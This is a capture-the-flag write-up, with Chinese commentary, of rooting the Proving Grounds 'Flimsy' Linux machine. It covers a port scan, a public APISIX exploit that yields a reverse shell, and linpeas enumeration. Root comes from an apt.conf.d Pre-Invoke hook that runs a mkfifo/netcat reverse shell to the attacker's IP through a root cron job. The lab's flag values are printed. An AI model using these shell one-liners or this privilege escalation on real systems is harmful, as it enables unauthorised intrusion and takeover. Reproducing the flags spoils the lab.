###### tags: `Offsec` `PG Practice` `Easy` `Linux`

# Flimsy
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.162.220 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.162.220:22
Open 192.168.162.220:80
Open 192.168.162.220:3306
Open 192.168.162.220:9443
Open 192.168.162.220:43500

PORT      STATE SERVICE             REASON  VERSION
22/tcp    open  ssh                 syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http                syn-ack OpenResty web app server 1.21.4.1
3306/tcp  open  mysql               syn-ack MySQL (unauthorized)
9443/tcp  open  ssl/tungsten-https? syn-ack
43500/tcp open  http                syn-ack OpenResty web app server
|_http-server-header: APISIX/2.8
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

google找到[edb-50829](https://www.exploit-db.com/exploits/50829)，下載下來用，要等一下
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9001

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 50829.py http://192.168.162.220:43500/ 192.168.45.228 9001

python3 -c 'import pty; pty.spawn("/bin/bash")'
franklin@flimsy:/root$ whoami
franklin
```

在`/home/franklin`可得local.txt
```
franklin@flimsy:/home/franklin$ cat local.txt
9f3ee8cb32ea2affc8b31aa18b325b0b
```

使用`linpeas.sh`
```
franklin@flimsy:/tmp$ wget 192.168.45.228/linpeas.sh
franklin@flimsy:/tmp$ chmod +x linpeas.sh
franklin@flimsy:/tmp$ ./linpeas.sh

...
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * root apt-get update
* * * * * root /root/run.sh
...
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                           
/dev/mqueue
/dev/shm
/etc/apt/apt.conf.d
/run/lock
/run/screen
/snap/core20/1581/run/lock
/snap/core20/1581/tmp
/snap/core20/1581/var/tmp
/snap/core20/1587/run/lock
/snap/core20/1587/tmp
/snap/core20/1587/var/tmp
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

...
```

google可以找到[apt update執行PE](https://systemweakness.com/code-execution-with-apt-update-in-crontab-privesc-in-linux-e6d6ffa8d076)
先建立一個腳本`00privesc`
```
## 00privesc
#!/bin/bash

APT::Update::Pre-Invoke { "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.228 9002 >/tmp/f"}; }
```

放在`/etc/apt/apt.conf.d`路徑，等他反彈就行
```
franklin@flimsy:/etc/apt/apt.conf.d$ wget 192.168.45.228/00privesc

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9002

# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@flimsy:~# cat proof.txt
536706dbf9c18f3984e66f024ad9588f
```